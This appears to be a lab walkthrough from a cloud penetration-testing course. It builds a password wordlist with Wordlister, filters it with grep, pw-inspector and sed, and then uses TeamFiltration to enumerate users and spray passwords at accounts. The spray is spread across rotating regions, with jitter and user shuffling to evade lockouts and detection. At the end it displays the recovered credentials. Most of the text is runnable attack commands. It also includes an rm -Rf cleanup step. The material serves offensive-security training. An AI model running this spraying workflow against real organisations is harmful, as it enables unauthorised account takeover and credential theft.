**Build a wordlist that matches the below syntax**

SnakeJazz2020, which would be: Snake + Jazz + 2020

```python
echo "2019" >> /opt/Wordlister/words.txt
```

```python
echo "2020" >> /opt/Wordlister/words.txt
```

```python
echo "2021" >> /opt/Wordlister/words.txt
```

```python
echo "2022" >> /opt/Wordlister/words.txt
```

** Use the wordlister python script to manipulate the words.txt file**
```python
python3 /opt/Wordlister/wordlister.py --cap --input /opt/Wordlister/words.txt --perm 3 --min 4 --max 30
```
>
    
    --input: `words.txt is the output
    --cap: This capitalizes all the words
    --perm 3: This instructs Wordlister to make a permutation of 3 words
    --min 4: The minimum number of characters is 4
    --max 30: The maximum number of characters is 30

**Validate that what we have done will show us the password of BirdPerson2021, which we can use as a true positive**
```python
cat /opt/Wordlister/output.txt  | grep -E '^BirdPerson2021'
```

**If this command shows BirdPerson2021, we have built a wordlist containing the right format**
```python
cat /opt/Wordlister/output.txt  | grep -v '^20\|Tammy\|Terry\|Gummerman\|terry\|tammy\|jerry\|Jerry\|Smith\|Summer\Sleepy\|sleepy\|gary\|Gary' > /opt/Wordlister/pw1.txt
```

**Run this through the pw-inspector tool from hydra; this tool will remove all small words**
```python
pw-inspector -i /opt/Wordlister/pw1.txt -o /opt/Wordlister/pw2.txt -m 13 -M 20 -c 3 -l -u -n
```
>
    
    -m 13: minimum of 13
    -M 20: maximum of 20
    -c 3 : number of types required for character sets
    -l : lowercase characters
    -u : uppercase characters
    -n : numerical characters

**Next remove all the words that do not reflect, starting with a capitalized character**
```python
sed '/^[[:lower:][:punct:]]/d' /opt/Wordlister/pw2.txt > /opt/Wordlister/pw3.txt
```

**Have the grep command use Regex only to include words that end in numbers**
```python
grep -E '[0-9]$' /opt/Wordlister/pw3.txt > /opt/Wordlister/pw4.txt
```

** Let's validate that the list contains passwords that match our list of words**
```python
cat /opt/Wordlister/pw4.txt | grep '^BirdPerson2021'
```

**Use the TeamFiltration tool to spray usernames**

Sometimes this tool will crash and you will receive the following errors:

    - Cannot resolve the Amazon API Gateway that was just created
    - Too many Gateway request for delete at one time
    - False negatives where this may occur in the middle of a scan

It is important to note that while this may seem like a problem, in many cases deleting the database can help you recover. Here is a simple way to do so
```python
rm -Rf /home/sec588/Coursefiles/workdir/teamfiltration
```

```python
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/users.txt
```

**TEAMFILTRATION COMMAND TO EXECUTE!**
```python
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 3 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/users.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions
```
>
    
    --usernames: A file containing the usernames
    --outpath: This is the location where the teamfiltration database will live
    --config: This is the configuration file to use
    --validate-login: Use the more "noisy" flag in this way it will have 1 bad password attempt per email address
    --spray: This is to perform a password spraying attack
    --sleep-min: This will set the minimal sleep interval (1 minutes)
    --sleep-max: This will set the maximum internal to wait (3 minutes)
    --jitter: This is the amount to jitter between maximum and minimum time intervals
    --usernames: This is the file containing usernames
    --passwords: This is the file containing passwords
    --shuffle-users: This command is to shuffle the usernames to test so that they are tested in different orders
    --shuffle-region: This command is to shuffle between regions

**View results with the --database flag**
```python
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database
```
```python
show creds
```
```python
exit
```

